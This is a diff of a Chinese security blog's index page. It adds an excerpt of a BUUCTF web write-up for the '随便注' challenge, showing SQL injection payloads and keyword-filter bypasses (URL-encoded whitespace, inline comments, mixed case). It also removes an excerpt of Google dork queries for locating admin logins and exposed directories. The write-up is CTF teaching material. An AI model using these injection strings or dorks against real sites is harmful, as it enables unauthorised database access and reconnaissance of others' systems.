@@ -151,6 +151,45 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2026/01/13/BUUCTF-Web/" >Web合集</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-01-13  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">万能钥匙：<span class="number">1</span><span class="string">&#x27; or 1=1 -- +qwe 成功闭合</span></span><br><span class="line"><span class="string">测试列数：1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> <span class="comment">-- +qwe 实为2列，超过2报错</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">探测显示位：<span class="number">1</span><span class="string">&#x27; union select 1,2 -- +qwe</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF-Web/image_1.png" alt="BUUCTF-Web·图1"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">尝试一下绕过正则过滤：<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 -- +qwe</span></span><br></pre></td></tr></table></figure>
+<p><img loading="lazy" decoding="async" src="/images/BUUCTF-Web/image_2.png" alt="BUUCTF-Web·图2"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">继续尝试：<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img loading="lazy" decoding="async" src="/images/BUUCTF-Web/image_3.png" alt="BUUCTF-Web·图3"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">引入一些绕过技巧，当然在这题均失败</span><br><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="operator">%</span><span class="number">0</span>Dlect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se%0Blect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="operator">%</span><span class="number">0</span>Clect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union s%09e%09l%09e%09c%09t%091,2%09--%09qwe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注释绕过：</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="comment">/**/</span>lect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se/*a*/lect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="comment">/*abc*/</span>lect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line"></span><br><span class="line">大小写绕过：(这肯定失败： <span class="operator">/</span>i)</span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union sElEct 1,2 -- +qwe</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>‘正常’ 的select 等不可用，那就尝试一下堆叠注入</p>
+</blockquote>
+	
+	</div>
+  <a type="button" href="/2026/01/13/BUUCTF-Web/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2025/12/30/Java基础/" >Java基础</a>
 		</h3>
 		</div>
@@ -292,45 +331,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2025/12/28/搜索指令大全/" >搜索指令大全</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2025-12-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="Google-Dork-实战速查"><a href="#Google-Dork-实战速查" class="headerlink" title="Google Dork 实战速查"></a>Google Dork 实战速查</h1><blockquote>
-<p>Google 不支持 <code>|</code> 作为 OR，必须用大写 <code>OR</code>；<code>inurl:(a OR b)</code> 的括号分组写法部分场景可能不生效，保守写法为 <code>inurl:a OR inurl:b</code>。</p>
-</blockquote>
-<h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p><strong>查找后台地址：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:(login OR admin OR manage OR member OR admin_login OR login_admin OR system OR user OR main OR cms)</span><br><span class="line">site:target.com intext:(管理 OR 后台 OR 后台管理 OR 登陆 OR 登录 OR 用户名 OR 密码 OR 系统 OR 账号 OR login OR system)</span><br><span class="line">site:target.com inurl:(login OR admin OR manage OR manager OR admin_login OR system OR backend)</span><br><span class="line">site:target.com intitle:(管理 OR 后台 OR 后台管理 OR 登陆 OR 登录)</span><br><span class="line">site:target.com 默认密码</span><br></pre></td></tr></table></figure>
-
-<p><strong>特定系统&#x2F;设备指纹：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:&quot;cgi-bin/koha&quot;</span><br><span class="line"></span><br><span class="line"># 注意不是 -checkpoint.com</span><br><span class="line">intitle:&quot;SSL Network Extender Login&quot; -site:checkpoint.com    </span><br><span class="line"></span><br><span class="line">intext:&quot;siemens&quot; inurl:&quot;/portal/portal.mwsl&quot;</span><br><span class="line"></span><br><span class="line"># 如果不加双引号其匹配精度变低</span><br><span class="line">intext:&quot;GlobalProtect Portal&quot;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>目录遍历：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># intitle: 后多词短语必须加引号，intitle:&quot;index of&quot; 而非 intitle:index of（后者只匹配 index 在标题）</span><br><span class="line">site:target.com intitle:&quot;index of&quot;</span><br><span class="line"></span><br><span class="line"># 组合&quot;父目录&quot;特征，减少误报，同时也可以在末尾加 &quot;-&quot; 来排除干扰页面</span><br><span class="line">site:target.com intitle:&quot;index of&quot; intext:&quot;[To Parent Directory]&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>迂回策略入侵（目录结构探测）：</strong></p>
-	
-	</div>
-  <a type="button" href="/2025/12/28/搜索指令大全/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
 
 		</div>
 
@@ -377,7 +377,7 @@
 <div class="widget-wrap">
   <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
   <div class="widget category-tree">
-    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/AI/">AI</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/Misc/">Misc</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">31</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/APP%E6%B8%97%E9%80%8F/">APP渗透</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/">Java安全</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">7</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/">渗透&&攻防</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E7%BA%A2%E9%98%9F/">红队</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">15</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/">WEB</a><span class="hacker-category-list-count">10</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/Top10/">Top10</a><span class="hacker-category-list-count">10</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">3</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/AI/">AI</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/Misc/">Misc</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">32</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/APP%E6%B8%97%E9%80%8F/">APP渗透</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/">Java安全</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC/">SRC</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">7</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/">渗透&&攻防</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E7%BA%A2%E9%98%9F/">红队</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">15</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/">WEB</a><span class="hacker-category-list-count">10</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/Top10/">Top10</a><span class="hacker-category-list-count">10</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">3</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
   </div>
 </div>
 
@@ -431,43 +431,43 @@
 		
 			<li><a href="/tags/栈/">栈<span>1</span></a></li>
 		
-			<li><a href="/tags/文件上传/">文件上传<span>1</span></a></li>
+			<li><a href="/tags/域渗透/">域渗透<span>2</span></a></li>
 		
-			<li><a href="/tags/应用层/">应用层<span>1</span></a></li>
-		
-			<li><a href="/tags/Mysql/">Mysql<span>1</span></a></li>
-		
-			<li><a href="/tags/python/">python<span>1</span></a></li>
-		
-			<li><a href="/tags/CNN与RNN基础/">CNN与RNN基础<span>1</span></a></li>
-		
-			<li><a href="/tags/信息安全工程师/">信息安全工程师<span>1</span></a></li>
-		
-			<li><a href="/tags/Java/">Java<span>1</span></a></li>
-		
-			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
-		
-			<li><a href="/tags/root/">root<span>1</span></a></li>
-		
-			<li><a href="/tags/Jenkins/">Jenkins<span>1</span></a></li>
-		
-			<li><a href="/tags/CORS/">CORS<span>2</span></a></li>
-		
-			<li><a href="/tags/刷机/">刷机<span>1</span></a></li>
-		
-			<li><a href="/tags/js/">js<span>2</span></a></li>
-		
-			<li><a href="/tags/隧道技术/">隧道技术<span>1</span></a></li>
+			<li><a href="/tags/邮箱解析/">邮箱解析<span>1</span></a></li>
 		
 			<li><a href="/tags/红队/">红队<span>1</span></a></li>
 		
 			<li><a href="/tags/XXE/">XXE<span>1</span></a></li>
 		
-			<li><a href="/tags/堆/">堆<span>1</span></a></li>
+			<li><a href="/tags/CNN与RNN基础/">CNN与RNN基础<span>1</span></a></li>
 		
-			<li><a href="/tags/Google-Hacking/">Google Hacking<span>1</span></a></li>
+			<li><a href="/tags/SSH/">SSH<span>1</span></a></li>
 		
-			<li><a href="/tags/Misc/">Misc<span>1</span></a></li>
+			<li><a href="/tags/应用层/">应用层<span>1</span></a></li>
+		
+			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
+		
+			<li><a href="/tags/PWN/">PWN<span>1</span></a></li>
+		
+			<li><a href="/tags/WEB/">WEB<span>1</span></a></li>
+		
+			<li><a href="/tags/hook/">hook<span>1</span></a></li>
+		
+			<li><a href="/tags/文件上传/">文件上传<span>1</span></a></li>
+		
+			<li><a href="/tags/计算机体系架构/">计算机体系架构<span>1</span></a></li>
+		
+			<li><a href="/tags/JWT/">JWT<span>1</span></a></li>
+		
+			<li><a href="/tags/Java/">Java<span>1</span></a></li>
+		
+			<li><a href="/tags/数据链路层/">数据链路层<span>1</span></a></li>
+		
+			<li><a href="/tags/同源策略/">同源策略<span>1</span></a></li>
+		
+			<li><a href="/tags/业务逻辑漏洞/">业务逻辑漏洞<span>1</span></a></li>
+		
+			<li><a href="/tags/GitHub-Dork/">GitHub Dork<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>56</span></a></li>
@@ -483,6 +483,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2026/11/19/从小程序杀到web后台的心路历程/" ><i class="fa fa-file-o"></i>从小程序杀到web后台的心路历程</a>
+      </li>
+    
+      <li>
         <a href="/2026/11/16/VPN抗封锁/" ><i class="fa fa-file-o"></i>VPN抗封锁</a>
       </li>
     
@@ -496,10 +500,6 @@
     
       <li>
         <a href="/2026/10/11/应急响应基础/" ><i class="fa fa-file-o"></i>应急响应基础</a>
-      </li>
-    
-      <li>
-        <a href="/2026/10/09/BUUCTF-Misc/" ><i class="fa fa-file-o"></i>Misc合集</a>
       </li>
     
   </ul>
